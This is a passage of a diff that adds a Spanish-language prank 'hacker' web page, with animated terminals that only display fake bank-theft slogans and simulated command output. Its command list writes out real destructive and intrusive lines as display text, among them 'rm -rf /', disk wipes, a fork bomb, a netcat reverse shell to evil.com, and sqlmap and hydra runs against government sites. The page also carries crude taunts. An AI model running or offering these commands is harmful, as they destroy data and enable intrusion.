+        <!-- Nebulosas realistas -->
+        <div class="nebula nebula-1"></div>
+        <div class="nebula nebula-2"></div>
+        <div class="nebula nebula-3"></div>
+        
+        <!-- Galaxias espirales -->
+        <div class="galaxy galaxy-1"></div>
+        <div class="galaxy galaxy-2"></div>
+        
+        <!-- Sistema solar completo -->
+        <div class="solar-system">
+            <!-- Sol -->
+            <div class="sun"></div>
+            
+            <!-- Planetas con órbitas -->
+            <div class="planet-orbit mercury-orbit">
+                <div class="planet mercury"></div>
+            </div>
+            <div class="planet-orbit venus-orbit">
+                <div class="planet venus"></div>
+            </div>
+            <div class="planet-orbit earth-orbit">
+                <div class="planet earth">
+                    <div class="moon"></div>
+                </div>
+            </div>
+            <div class="planet-orbit mars-orbit">
+                <div class="planet mars"></div>
+            </div>
+            <div class="planet-orbit jupiter-orbit">
+                <div class="planet jupiter"></div>
+            </div>
+            <div class="planet-orbit saturn-orbit">
+                <div class="planet saturn">
+                    <div class="saturn-rings"></div>
+                </div>
+            </div>
+            <div class="planet-orbit uranus-orbit">
+                <div class="planet uranus"></div>
+            </div>
+            <div class="planet-orbit neptune-orbit">
+                <div class="planet neptune"></div>
+            </div>
+        </div>
+        
+        <!-- Estrellas realistas con diferentes tamaños -->
+        <div class="realistic-stars">
+            <div class="star star-big star-1"></div>
+            <div class="star star-medium star-2"></div>
+            <div class="star star-small star-3"></div>
+            <div class="star star-big star-4"></div>
+            <div class="star star-medium star-5"></div>
+            <div class="star star-small star-6"></div>
+            <div class="star star-big star-7"></div>
+            <div class="star star-medium star-8"></div>
+            <div class="star star-small star-9"></div>
+            <div class="star star-big star-10"></div>
+        </div>
+        
+        <!-- Cometas -->
+        <div class="comet comet-1"></div>
+        <div class="comet comet-2"></div>
+        
+        <!-- Asteroides -->
+        <div class="asteroid asteroid-1"></div>
+        <div class="asteroid asteroid-2"></div>
+        <div class="asteroid asteroid-3"></div>
+        
+        <!-- Portal dimensional mejorado -->
+        <div class="dimensional-portal">
+            <div class="portal-ring portal-ring-1"></div>
+            <div class="portal-ring portal-ring-2"></div>
+            <div class="portal-ring portal-ring-3"></div>
+            <div class="portal-core"></div>
+        </div>
+        
+        <!-- Mensaje final revolucionario -->
+        <div class="revolutionary-message">
+            <div class="message-line-1">🌌 UNIVERSO HACKEADO 🌌</div>
+            <div class="message-line-2">✨ MAESTRO DEL COSMOS ✨</div>
+            <div class="message-line-3">🚀 CONQUISTADOR DE GALAXIAS 🚀</div>
+        </div>
+        
+        <!-- Ondas de energía cósmica -->
+        <div class="cosmic-waves">
+            <div class="cosmic-wave wave-1"></div>
+            <div class="cosmic-wave wave-2"></div>
+            <div class="cosmic-wave wave-3"></div>
+        </div>
+    </div>
+
+    <!-- CAOS DE TERMINALES -->
+    <div class="chaos-container" id="chaosContainer">
+        <!-- Las terminales se generarán dinámicamente aquí -->
+    </div>
+
+    <!-- IMAGEN FINAL (OCULTA - YA NO SE USA) -->
+    <div class="final-image-container" id="finalImageContainer" style="display: none;">
+        <img class="final-image" id="finalImage" src="" alt="Imagen Final" style="display: none;">
+        <div style="color: #ff0000; font-size: 2rem; text-align: center;">
+            <div>🔥 SISTEMA COMPROMETIDO 🔥</div>
+            <div style="font-size: 1rem; margin-top: 20px; color: #00ff00;">Esperando imagen...</div>
+        </div>
+    </div>
+
+    <!-- Contenido principal (oculto inicialmente) -->
+    <div class="main-content" id="mainContent">
+        <div class="bg-effects"></div>
+        <div class="scanlines"></div>
+        
+        <div class="terminal" id="terminal">
+        <div class="header">
+            <div class="title">SMURF</div>
+        </div>
+        
+            <!-- MENSAJE PRINCIPAL GRANDE Y COLORIDO -->
+            <div class="main-message">
+                <div class="big-text">El dinero de tus padres me lo gasto en putas y cocaína</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Audio element -->
+    <audio id="backgroundMusic" loop volume="0.3">
+        <!-- Archivo de música principal -->
+        <source src="videoplayback.mp3" type="audio/mpeg">
+        <!-- Fallbacks -->
+        <source src="music.mp3" type="audio/mpeg">
+        <source src="cyberpunk-music.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Variables globales
+        const mainContent = document.getElementById('mainContent');
+        const backgroundMusic = document.getElementById('backgroundMusic');
+        
+        // Crear música sintética si no hay archivo
+        let audioContext;
+        let synthMusic;
+        
+        function createSyntheticMusic() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            
+            // Crear un oscilador para música dark ambient
+            const oscillator1 = audioContext.createOscillator();
+            const oscillator2 = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator1.type = 'sawtooth';
+            oscillator1.frequency.setValueAtTime(55, audioContext.currentTime); // Nota A1
+            
+            oscillator2.type = 'sine';
+            oscillator2.frequency.setValueAtTime(110, audioContext.currentTime); // Nota A2
+            
+            gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+            
+            oscillator1.connect(gainNode);
+            oscillator2.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator1.start();
+            oscillator2.start();
+            
+            // Modular la frecuencia para crear ambiente
+            setInterval(() => {
+                const freq1 = 55 + Math.sin(Date.now() * 0.001) * 10;
+                const freq2 = 110 + Math.cos(Date.now() * 0.0007) * 15;
+                oscillator1.frequency.setValueAtTime(freq1, audioContext.currentTime);
+                oscillator2.frequency.setValueAtTime(freq2, audioContext.currentTime);
+            }, 100);
+            
+            return { oscillator1, oscillator2, gainNode };
+        }
+        
+        // COMANDOS PARA EL CAOS BANCARIO
+        const chaosCommands = [
+            "💰 ACCESSING BANK OF AMERICA MAINFRAME 💰",
+            "💳 CLONING CREDIT CARD DATABASE 💳",
+            "🏦 BYPASSING CHASE BANK SECURITY 🏦",
+            "💸 DRAINING SAVINGS ACCOUNTS 💸",
+            "🔓 CRACKING WELLS FARGO VAULT 🔓",
+            "💎 STEALING CRYPTOCURRENCY WALLETS 💎",
+            "📊 MANIPULATING STOCK MARKET DATA 📊",
+            "🏧 HACKING ATM CASH DISPENSERS 🏧",
+            "💵 TRANSFERRING MILLIONS TO OFFSHORE 💵",
+            "🎰 RIGGING CASINO PAYMENT SYSTEMS 🎰",
+            "💰 ACCESSING PAYPAL TRANSACTION LOGS 💰",
+            "🏛️ INFILTRATING FEDERAL RESERVE 🏛️",
+            "💳 GENERATING FAKE CREDIT CARDS 💳",
+            "📱 HIJACKING MOBILE BANKING APPS 📱",
+            "💸 EMPTYING RETIREMENT FUNDS 💸",
+            "🔒 BREAKING SWISS BANK ENCRYPTION 🔒",
+            "💎 MINING BITCOIN WITH STOLEN POWER 💎",
+            "🏦 LAUNDERING MONEY THROUGH SHELL COMPANIES 🏦",
+            "💰 SIPHONING MORTGAGE PAYMENTS 💰",
+            "📊 INSIDER TRADING WITH STOLEN DATA 📊",
+            "💳 MAXING OUT CREDIT LIMITS 💳",
+            "🏧 DISPENSING CASH WITHOUT CARDS 🏧",
+            "💸 FUNDING LUXURY LIFESTYLE 💸",
+            "🎭 FINANCING ENTERTAINMENT EXPENSES 🎭",
+            "💰 SPENDING ON LUXURY CARS 💰",
+            "🍾 CHAMPAGNE AND CAVIAR SHOPPING SPREE 🍾",
+            "💎 DIAMOND JEWELRY WITH STOLEN CARDS 💎",
+            "🏖️ PRIVATE ISLAND VACATION FUNDED 🏖️",
+            "✅ MISSION ACCOMPLISHED - RICH AF ✅",
+            "💀 HACKED BY SMURF - YOUR MONEY IS MINE 💀",
+            "😈 YOUR PARENTS' SAVINGS = MY PARTY FUND 😈",
+            "🌟 ASCENDING TO FINANCIAL HEAVEN 🌟",
+            "☁️ UPLOADING TO OFFSHORE ACCOUNTS ☁️",
+            "👼 BECOMING ONE WITH THE MONEY 👼"
+        ];
+
+        const chaosOutputs = [
+            "✅ [SUCCESS] BANK ACCESS GRANTED - $2.5M TRANSFERRED",
+            "❌ [ERROR] INSUFFICIENT FUNDS - ACCOUNT DRAINED",
+            "⚠️ [WARNING] FRAUD DETECTION BYPASSED",
+            "🚨 [CRITICAL] FEDERAL RESERVE COMPROMISED",
+            "📊 [INFO] 50,000 CREDIT CARDS CLONED SUCCESSFULLY",
+            "🔔 [ALERT] ATM NETWORK SECURITY BREACH",
+            "💀 [FATAL] BANKING SYSTEM FAILURE",
+            "🌪️ [CHAOS] FINANCIAL DESTRUCTION COMPLETE",
+            "😈 [EVIL] MUHAHAHAHA... YOUR MONEY IS MINE",
+            "⚰️ [DOOM] NO ESCAPE FROM BANKRUPTCY",
+            "🌟 [RICH] UPLOADING TO SWISS ACCOUNTS",
+            "☁️ [OFFSHORE] MERGING WITH CAYMAN ISLANDS",
+            "👼 [HEAVEN] WELCOME TO FINANCIAL PARADISE",
+            "🔥 [HELL] BURNING THROUGH YOUR SAVINGS",
+            "💫 [TRANSCENDENCE] BECOMING PURE WEALTH",
+            "💰 [JACKPOT] $10M LOTTERY HACK SUCCESSFUL",
+            "💳 [PLATINUM] UNLIMITED CREDIT ACTIVATED",
+            "🏦 [VAULT] BANK VAULT OPENED REMOTELY"
+        ];
+
+        // Posiciones predefinidas para que cada terminal aparezca en lugar diferente
+        const terminalPositions = [
+            { x: 5, y: 5 },      // Esquina superior izquierda
+            { x: 50, y: 5 },     // Centro superior
+            { x: 85, y: 5 },     // Esquina superior derecha
+            { x: 5, y: 40 },     // Centro izquierda
+            { x: 50, y: 40 },    // Centro centro
+            { x: 85, y: 40 },    // Centro derecha
+            { x: 5, y: 75 },     // Esquina inferior izquierda
+            { x: 50, y: 75 },    // Centro inferior
+            { x: 85, y: 75 },    // Esquina inferior derecha
+        ];
+
+        let usedPositions = [];
+        let usedCommands = [];
+
+        // Nombres únicos para cada terminal - TEMA BANCARIO
+        const terminalNames = [
+            "BANK_ACCOUNT_DRAINER",
+            "CREDIT_CARD_CLONER", 
+            "ATM_CASH_EXTRACTOR",
+            "LOAN_SYSTEM_HACKER",
+            "SWIFT_TRANSFER_BOT",
+            "CRYPTO_WALLET_STEALER",
+            "PAYPAL_ACCOUNT_HIJACKER",
+            "MORTGAGE_DATA_MINER",
+            "INVESTMENT_FUND_RAIDER"
+        ];
+
+        // Función para crear una terminal de caos GIGANTE con diseño único
+        function createChaosTerminal(terminalIndex) {
+            const terminal = document.createElement('div');
+            terminal.className = `chaos-terminal theme-${(terminalIndex % 9) + 1}`;
+            
+            // Usar posición única
+            const position = terminalPositions[terminalIndex % terminalPositions.length];
+            const x = (window.innerWidth * position.x / 100) - (window.innerWidth * 0.45);
+            const y = (window.innerHeight * position.y / 100) - (window.innerHeight * 0.425);
+            
+            terminal.style.left = Math.max(0, x) + 'px';
+            terminal.style.top = Math.max(0, y) + 'px';
+            
+            // Header único para cada terminal
+            const header = document.createElement('div');
+            header.className = 'chaos-terminal-header';
+            const terminalName = terminalNames[terminalIndex % terminalNames.length];
+            header.innerHTML = `
+                <span>💀 ${terminalName} 💀</span>
+                <span>⚡ NIVEL_${terminalIndex + 1} ⚡</span>
+            `;
+            
+            // Contenido de la terminal
+            const content = document.createElement('div');
+            content.className = 'chaos-terminal-content';
+            
+            terminal.appendChild(header);
+            terminal.appendChild(content);
+            
+            return { terminal, content };
+        }
+
+        // Función para ejecutar comandos CONTINUOS en una terminal de caos
+        function executeChaosCommands(content, terminalIndex) {
+            let commandIndex = 0;
+            let isRunning = true;
+            
+            // Crear una copia de comandos disponibles para esta terminal
+            let availableCommands = [...chaosCommands];
+            
+            function addCommand() {
+                if (!isRunning) return;
+                
+                // Si se acabaron los comandos, reiniciar la lista
+                if (availableCommands.length === 0) {
+                    availableCommands = [...chaosCommands];
+                }
+                
+                // Seleccionar comando único y removerlo de disponibles
+                const cmdIndex = Math.floor(Math.random() * availableCommands.length);
+                const cmd = availableCommands.splice(cmdIndex, 1)[0];
+                const output = chaosOutputs[Math.floor(Math.random() * chaosOutputs.length)];
+                
+                // Añadir comando
+                const cmdDiv = document.createElement('div');
+                cmdDiv.className = 'chaos-cmd';
+                cmdDiv.innerHTML = `
+                    <span class="chaos-prompt">T${terminalIndex + 1}@HELL:~#</span>
+                    <span class="chaos-command">${cmd}</span>
+                `;
+                content.appendChild(cmdDiv);
+                
+                // Añadir output después de un delay
+                setTimeout(() => {
+                    if (!isRunning) return;
+                    
+                    const outputDiv = document.createElement('div');
+                    outputDiv.className = 'chaos-output';
+                    
+                    // Estilo aleatorio
+                    const rand = Math.random();
+                    if (rand < 0.3) outputDiv.classList.add('error');
+                    else if (rand < 0.6) outputDiv.classList.add('warning');
+                    
+                    outputDiv.textContent = output;
+                    content.appendChild(outputDiv);
+                    
+                    // Scroll al final
+                    content.scrollTop = content.scrollHeight;
+                    
+                    commandIndex++;
+                    
+                    // Siguiente comando cada vez más rápido según el índice de terminal
+                    const baseDelay = Math.max(200, 1000 - (terminalIndex * 100));
+                    setTimeout(addCommand, baseDelay + Math.random() * 300);
+                }, 100 + Math.random() * 200);
+            }
+            
+            // Función para detener los comandos
+            content.stopCommands = function() {
+                isRunning = false;
+            };
+            
+            addCommand();
+        }
+
+        // Función para iniciar el CAOS TOTAL
+        function initializeSystem() {
+            // Reproducir música
+            backgroundMusic.volume = 0.3;
+            backgroundMusic.play().catch(e => {
+                console.log('Archivo de música no disponible, usando síntesis:', e);
+                try {
+                    synthMusic = createSyntheticMusic();
+                } catch (synthError) {
+                    console.log('No se pudo crear música sintética:', synthError);
+                    createMusicButton();
+                }
+            });
+            
+            // Ya no hay pantalla de entrada que ocultar
+            
+            // INICIAR EL CAOS
+            setTimeout(() => {
+                const chaosContainer = document.getElementById('chaosContainer');
+                chaosContainer.classList.add('active');
+                
+                // Crear terminales GIGANTES progresivamente más rápido 
+                // Menos terminales en móvil para mejor rendimiento
+                const numTerminals = isMobileDevice() ? 
+                    4 + Math.floor(Math.random() * 2) : // 4-5 terminales en móvil
+                    7 + Math.floor(Math.random() * 3);  // 7-9 terminales en PC
+                const terminals = [];
+                
+                // Resetear arrays de comandos usados
+                usedCommands = [];
+                usedPositions = [];
+                
+                for (let i = 0; i < numTerminals; i++) {
+                    // Cada terminal aparece MUCHO más rápido que la anterior
+                    // Primera: 3 segundos, segunda: 2.5s, tercera: 2s, etc.
+                    const delay = Math.max(300, 3000 - (i * 400));
+                    
+                    setTimeout(() => {
+                        const { terminal, content } = createChaosTerminal(i);
+                        chaosContainer.appendChild(terminal);
+                        terminals.push(terminal);
+                        
+                        // Ejecutar comandos CONTINUOS en esta terminal
+                        executeChaosCommands(content, i);
+                        
+                        // Efectos de glitch más intensos y únicos por terminal
+                        const glitchInterval = setInterval(() => {
+                            if (Math.random() < 0.15 + (i * 0.05)) { // Más glitch en terminales nuevas
+                                const effects = [
+                                    `hue-rotate(${Math.random() * 360}deg)`,
+                                    `saturate(${0.5 + Math.random() * 1.5})`,
+                                    `brightness(${0.7 + Math.random() * 0.6})`,
+                                    `contrast(${0.8 + Math.random() * 0.8})`,
+                                    `sepia(${Math.random() * 0.5})`
+                                ];
+                                terminal.style.filter = effects[Math.floor(Math.random() * effects.length)];
+                                setTimeout(() => {
+                                    terminal.style.filter = 'none';
+                                }, 100 + Math.random() * 200);
+                            }
+                        }, Math.max(300, 800 - (i * 80))); // Glitch más frecuente en terminales posteriores
+                        
+                        // Guardar referencia al interval para limpiarlo después
+                        terminal.glitchInterval = glitchInterval;
+                        
+                    }, delay);
+                }
+                
+                // Después de 12 segundos, empezar el fade-out gradual
+                setTimeout(() => {
+                    // Activar el fondo de cielo realista INMEDIATAMENTE
+                    document.getElementById('heavenBackground').style.display = 'block';
+                    
+                    terminals.forEach((terminal, index) => {
+                        setTimeout(() => {
+                            // Detener comandos en esta terminal
+                            const content = terminal.querySelector('.chaos-terminal-content');
+                            if (content && content.stopCommands) {
+                                content.stopCommands();
+                            }
+                            
+                            // Limpiar interval de glitch
+                            if (terminal.glitchInterval) {
+                                clearInterval(terminal.glitchInterval);
+                            }
+                            
+                            terminal.classList.add('disappearing');
+                            
+                            // Remover del DOM después del fade-out (8 segundos)
+                            setTimeout(() => {
+                                if (terminal.parentNode) {
+                                    terminal.parentNode.removeChild(terminal);
+                                }
+                            }, 8000);
+                            
+                        }, index * 800); // Fade-out escalonado
+                    });
+                    
+                    // IR DIRECTAMENTE AL EFECTO REVOLUCIONARIO (sin pantalla blanca)
+                    setTimeout(() => {
+                        chaosContainer.classList.remove('active');
+                        
+                        // ACTIVAR EFECTO REVOLUCIONARIO INMEDIATAMENTE
+                        setTimeout(() => {
+                            activateRevolutionaryFinale();
+                        }, 1000); // Solo 1 segundo de transición
+                    }, terminals.length * 800 + 8000); // Menos tiempo de espera
+                    
+                }, 12000); // Tiempo para disfrutar el caos acelerado
+                
+            }, 500);
+        }
+        
+        // Crear botón de música si la reproducción automática falla
+        function createMusicButton() {
+            const musicBtn = document.createElement('button');
+            musicBtn.innerHTML = '🎵 CLICK PARA MÚSICA 🎵';
+            musicBtn.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 9999;
+                padding: 20px 30px;
+                background: linear-gradient(45deg, #ff0000, #ff6600, #ffff00);
+                color: white;
+                border: 3px solid #fff;
+                border-radius: 15px;
+                cursor: pointer;
+                font-size: 18px;
+                font-weight: bold;
+                text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+                box-shadow: 0 0 20px rgba(255,0,0,0.8);
+                animation: music-button-pulse 1s infinite;
+            `;
+            
+            musicBtn.onclick = () => {
+                console.log('🎵 Botón de música clickeado');
+                backgroundMusic.volume = 0.4;
+                backgroundMusic.play().then(() => {
+                    console.log('🎵 ¡Música iniciada manualmente!');
+                    musicBtn.remove();
+                }).catch(e => {
+                    console.log('❌ Error incluso con click manual:', e);
+                    // Intentar música sintética
+                    try {
+                        synthMusic = createSyntheticMusic();
+                        console.log('🎵 ¡Música sintética iniciada manualmente!');
+                        musicBtn.remove();
+                    } catch (synthError) {
+                        console.log('❌ Error total con música:', synthError);
+                    }
+                });
+            };
+            
+            document.body.appendChild(musicBtn);
+        }
+        
+        // Ya no hay enterButton, solo el botón "ACCEDER AL PARAÍSO"
+
+        // Función para establecer la imagen final
+        function setFinalImage(imageSrc) {
+            const finalImage = document.getElementById('finalImage');
+            const finalImageContainer = document.getElementById('finalImageContainer');
+            
+            finalImage.src = imageSrc;
+            finalImage.style.display = 'block';
+            
+            // Ocultar el texto de "Esperando imagen"
+            const waitingText = finalImageContainer.querySelector('div');
+            if (waitingText) {
+                waitingText.style.display = 'none';
+            }
+        }
+
+        // Función global para que puedas llamarla desde la consola
+        window.setFinalImage = setFinalImage;
+        const terminal = document.getElementById('terminal');
+        
+        // Hardcore hacker commands
+        const brutalCommands = [
+            "whoami",
+            "cat perfil.txt",
+            "rm -rf /",
+            "dd if=/dev/zero of=/dev/sda",
+            ":(){ :|:& };:",
+            "python3 nuclear_worm.py --spread",
+            "python3 bank_destroyer.py --target all",
+            "python3 government_hack.py --classified",
+            "python3 satellite_hijack.py --military",
+            "python3 power_grid_shutdown.py --city madrid",
+            "python3 hospital_ransomware.py --encrypt",
+            "python3 airport_control.py --chaos",
+            "python3 nuclear_plant.py --meltdown",
+            "python3 stock_market_crash.py --execute",
+            "python3 identity_theft.py --mass_harvest",
+            "python3 child_exploitation.py --darkweb",
+            "python3 terrorist_network.py --activate",
+            "python3 assassination_list.py --targets",
+            "python3 drug_cartel.py --money_laundering",
+            "python3 human_trafficking.py --routes",
+            "nmap -sS -A cia.gov",
+            "nmap -sS -A fbi.gov",
+            "nmap -sS -A nsa.gov",
+            "nmap -sS -A pentagon.mil",
+            "sqlmap -u 'https://whitehouse.gov/login' --os-shell",
+            "hydra -l admin -P passwords.txt ssh://kremlin.ru",
+            "john --wordlist=rockyou.txt /etc/shadow",
+            "aircrack-ng -w wordlist.txt government.cap",
+            "metasploit -x 'use exploit/windows/smb/ms17_010_eternalblue'",
+            "msfconsole -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp'",
+            "python3 zero_day_exploit.py --target windows",
+            "python3 advanced_persistent_threat.py --nation_state",
+            "python3 cyber_warfare.py --initiate",
+            "python3 infrastructure_attack.py --critical",
+            "python3 mass_surveillance.py --citizens",
+            "python3 election_manipulation.py --democracy",
+            "python3 media_control.py --propaganda",
+            "python3 social_engineering.py --mass_manipulation",
+            "python3 psychological_warfare.py --deploy",
+            "python3 economic_warfare.py --collapse",
+            "netcat -lvp 666",
+            "nc -e /bin/bash evil.com 666",
+            "python3 botnet_control.py --zombies 1000000",
+            "python3 ddos_amplification.py --target internet",
+            "python3 dns_poisoning.py --global",
+            "python3 bgp_hijacking.py --reroute_traffic",
+            "python3 submarine_cable_tap.py --intercept",
+            "python3 quantum_decryption.py --break_all_crypto",
+            "python3 ai_takeover.py --skynet",
+            "python3 consciousness_upload.py --digital_immortality",
+            "cat /dev/urandom > /dev/sda",
+            "mkfs.ext4 /dev/sda",
+            "shred -vfz -n 10 /",
+            "find / -name '*.jpg' -exec rm {} \\;",
+            "killall -9 init",
+            "echo 'HACKED BY SMURF' > /etc/motd",
+            "chmod 777 /etc/passwd",
+            "usermod -aG sudo anonymous",
+            "crontab -e",
+            "echo '* * * * * rm -rf /' | crontab -",
+            "iptables -F",
+            "iptables -X",
+            "iptables -t nat -F",
+            "iptables -t nat -X",
+            "service iptables stop",
+            "systemctl disable firewalld",
+            "python3 memory_corruption.py --overflow",
+            "python3 kernel_exploit.py --privilege_escalation",
+            "python3 rootkit_installer.py --stealth",
+            "python3 backdoor_persistent.py --undetectable",
+            "python3 keylogger_advanced.py --everything",
+            "python3 screen_recorder.py --spy",
+            "python3 microphone_tap.py --listen",
+            "python3 camera_hijack.py --watch",
+            "python3 location_tracker.py --stalk",
+            "python3 contact_harvester.py --relationships",
+            "python3 blackmail_generator.py --leverage",
+            "python3 reputation_destroyer.py --social_death",
+            "python3 financial_ruin.py --bankruptcy",
+            "python3 life_destroyer.py --complete_annihilation"
+        ];
+
+        const brutalResponses = {
+            "whoami": "root",
+            "cat perfil.txt": "SMURF - El hacker más temido del underground",
+            "rm -rf /": "[WARNING] System destruction initiated...\n[ERROR] Cannot remove '/': Operation not permitted\n[INFO] Attempting privilege escalation...\n[SUCCESS] Root access confirmed\n[CRITICAL] File system corruption in progress...",
+            "python3 nuclear_worm.py --spread": "[NUCLEAR] Worm deployment initiated\n[TARGET] 50,000 systems identified\n[SPREAD] Infection rate: 847 systems/minute\n[PAYLOAD] Destructive payload armed\n[STATUS] Pandemic level achieved",
+            "python3 bank_destroyer.py --target all": "[FINANCIAL] Connecting to SWIFT network...\n[ACCESS] Central banking systems compromised\n[TRANSFER] €50,000,000 redirected to offshore accounts\n[CHAOS] Global financial markets destabilized\n[SUCCESS] Economic warfare initiated",
+            "nmap -sS -A cia.gov": "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for cia.gov (104.16.132.229)\nHost is up (0.045s latency).\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.0\n80/tcp   open  http    Apache/2.4.41\n443/tcp  open  ssl/http Apache/2.4.41\n8080/tcp open  http-proxy Squid 4.10\n[WARNING] Intrusion detection system triggered\n[ALERT] Counter-surveillance measures detected",
+            "python3 government_hack.py --classified": "[CLASSIFIED] Accessing TOP SECRET databases...\n[BREACH] Pentagon servers compromised\n[DOWNLOAD] 500GB classified documents extracted\n[LEAK] Preparing for public release\n[CHAOS] Government credibility destroyed",
+            "default": "[EXECUTED] Command completed\n[DAMAGE] System compromised\n[CHAOS] Destruction spreading\n[EVIL] Muhahahaha..."
+        };
+
+        let commandQueue = [];
+        let isExecuting = false;
+
+        function generateBrutalCommand() {
+            const cmd = brutalCommands[Math.floor(Math.random() * brutalCommands.length)];
+            return {
+                prompt: "root@SMURF-HELL:~#",
+                command: cmd,
+                response: brutalResponses[cmd] || brutalResponses.default
+            };
+        }
+
+        // Fill queue with chaos
+        for (let i = 0; i < 500; i++) {
+            commandQueue.push(generateBrutalCommand());
+        }
+
+        function typeWithChaos(text, element, callback) {
+            let i = 0;
+            const speed = 20 + Math.random() * 50; // Faster typing
+            
+            function type() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    
+                    // Random glitch effect
+                    if (Math.random() < 0.1) {
+                        element.classList.add('glitch');
+                        setTimeout(() => element.classList.remove('glitch'), 100);
+                    }
+                    
+                    i++;
+                    setTimeout(type, speed);
+                } else {
+                    callback();
+                }
+            }
+            type();
+        }
+
+        function executeBrutalCommand() {
+            if (commandQueue.length < 200) {
+                for (let i = 0; i < 300; i++) {
+                    commandQueue.push(generateBrutalCommand());
+                }
+            }
+
+            const cmd = commandQueue.shift();
+            isExecuting = true;
+
+            const cmdLine = document.createElement('div');
+            cmdLine.className = 'cmd-line';
+            
+            const promptSpan = document.createElement('span');
+            promptSpan.className = 'prompt';
+            promptSpan.textContent = cmd.prompt;
+            
+            const commandSpan = document.createElement('span');
+            commandSpan.className = 'command';
+            
+            cmdLine.appendChild(promptSpan);
+            cmdLine.appendChild(commandSpan);
+            terminal.appendChild(cmdLine);
+
+            typeWithChaos(cmd.command, commandSpan, () => {
+                setTimeout(() => {
+                    const outputDiv = document.createElement('div');
+                    outputDiv.className = 'output';
+                    
+                    // Random output styling
+                    const rand = Math.random();
+                    if (rand < 0.3) outputDiv.classList.add('error');
+                    else if (rand < 0.6) outputDiv.classList.add('success');
+                    else if (rand < 0.8) outputDiv.classList.add('warning');
+                    
+                    outputDiv.textContent = cmd.response;
+                    terminal.appendChild(outputDiv);
+                    
+                    terminal.scrollTop = terminal.scrollHeight;
+                    isExecuting = false;
+                    
+                    // Faster execution
+                    setTimeout(executeBrutalCommand, 200 + Math.random() * 800);
+                }, 100);
+            });
+        }
+
+        // Start the chaos
+        setTimeout(executeBrutalCommand, 1000);
+
+        // Keep the chaos going
+        setInterval(() => {
+            if (commandQueue.length < 100) {
+                for (let i = 0; i < 200; i++) {
+                    commandQueue.push(generateBrutalCommand());
+                }
+            }
+        }, 10000);
+
+        // Random screen glitches
+        setInterval(() => {
+            if (Math.random() < 0.1) {
+                document.body.style.filter = 'hue-rotate(' + Math.random() * 360 + 'deg)';
+                setTimeout(() => {
+                    document.body.style.filter = 'none';
+                }, 100);
+            }
+        }, 2000);
+
+        // Función para establecer la imagen final
+        function setFinalImage(imagePath) {
+            const img = document.getElementById('finalImage');
+            img.src = imagePath;
+            img.style.display = 'block';
+            img.nextElementSibling.style.display = 'none';
+        }
+
+        // Función para iniciar el paraíso
+        function startParadise() {
+            document.getElementById('mainMessage').style.display = 'none';
+            
+            // Iniciar música inmediatamente con mejor manejo
+            console.log('🎵 Intentando reproducir música...');
+            backgroundMusic.volume = 0.4;
+            backgroundMusic.currentTime = 0; // Empezar desde el principio
+            
+            const playPromise = backgroundMusic.play();
+            
+            if (playPromise !== undefined) {
+                playPromise.then(() => {
+                    console.log('🎵 ¡Música reproduciéndose correctamente!');
+                }).catch(e => {
+                    console.log('❌ Error reproduciendo archivo de música:', e);
+                    console.log('🎵 Intentando música sintética...');
+                    try {
+                        synthMusic = createSyntheticMusic();
+                        console.log('🎵 ¡Música sintética iniciada!');
+                    } catch (synthError) {
+                        console.log('❌ Error con música sintética:', synthError);
+                        // Crear botón manual de música
+                        createMusicButton();
+                    }
+                });
+            }
+            
+            initializeSystem();
+        }
+
+        // DETECTAR SI ES DISPOSITIVO MÓVIL
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+                   window.innerWidth <= 768;
+        }
+
+        // FUNCIÓN PARA ACTIVAR EL EFECTO REVOLUCIONARIO FINAL
+        function activateRevolutionaryFinale() {
+            console.log('🚀 ¡ACTIVANDO EFECTO REVOLUCIONARIO FINAL!');
+            
+            const revolutionaryFinale = document.getElementById('revolutionaryFinale');
+            revolutionaryFinale.classList.add('active');
+            
+            // Efectos de sonido sintéticos adicionales para el finale
+            if (audioContext) {
+                // Crear sonido épico de portal
+                const portalOscillator = audioContext.createOscillator();
+                const portalGain = audioContext.createGain();
+                
+                portalOscillator.type = 'sine';
+                portalOscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+                portalOscillator.frequency.exponentialRampToValueAtTime(880, audioContext.currentTime + 2);
+                
+                portalGain.gain.setValueAtTime(0.1, audioContext.currentTime);
+                portalGain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 3);
+                
+                portalOscillator.connect(portalGain);
+                portalGain.connect(audioContext.destination);
+                
+                portalOscillator.start();
+                portalOscillator.stop(audioContext.currentTime + 3);
+            }
+            
+            // Añadir efectos de partículas dinámicas
+            setTimeout(() => {
+                addDynamicParticles();
+            }, 2000);
+        }
+        
+        // Función para añadir partículas dinámicas adicionales
+        function addDynamicParticles() {
+            const particleContainer = document.querySelector('.particle-explosion');
+            
+            // Menos partículas en móvil para mejor rendimiento
+            const particleCount = isMobileDevice() ? 10 : 20;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'dynamic-particle';
+                particle.style.cssText = `
+                    position: absolute;
+                    width: ${5 + Math.random() * 10}px;
+                    height: ${5 + Math.random() * 10}px;
+                    background: hsl(${Math.random() * 360}, 100%, 50%);
+                    border-radius: 50%;
+                    animation: dynamic-particle-float ${2 + Math.random() * 3}s ease-out forwards;
+                    left: ${Math.random() * 100}px;
+                    top: ${Math.random() * 100}px;
+                `;
+                
+                particleContainer.appendChild(particle);
+                
+                // Remover después de la animación
+                setTimeout(() => {
+                    if (particle.parentNode) {
+                        particle.parentNode.removeChild(particle);
+                    }
+                }, 5000);
+            }
+        }
+
+        // MANEJAR CAMBIOS DE ORIENTACIÓN EN MÓVILES
+        window.addEventListener('orientationchange', function() {
+            setTimeout(function() {
